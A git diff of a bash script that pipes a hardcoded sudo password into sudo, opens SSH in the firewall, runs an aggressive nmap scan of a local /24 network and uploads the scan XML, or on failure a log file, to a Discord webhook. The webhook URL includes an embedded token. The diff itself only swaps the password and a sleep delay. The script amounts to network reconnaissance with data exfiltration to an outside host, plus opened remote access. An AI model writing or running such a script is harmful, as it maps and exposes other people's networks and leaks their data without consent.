@@ -1,5 +1,5 @@
 #!/bin/bash
-if echo '45645' | sudo -S sh -c "sudo ufw allow ssh"; then
+if echo '12345' | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "nmap scan and sending xml..."
  	sudo nmap -T5 -A -v 192.168.178.1/24 -oX /home/$USER/net.xml  
   	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
@@ -11,7 +11,7 @@ if echo '45645' | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "ssh installed and enable. open port 22 "
 else	
 	curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
-	sleep 5
+	sleep 15
  	git stash
   	git rebase origin main
    	git pull
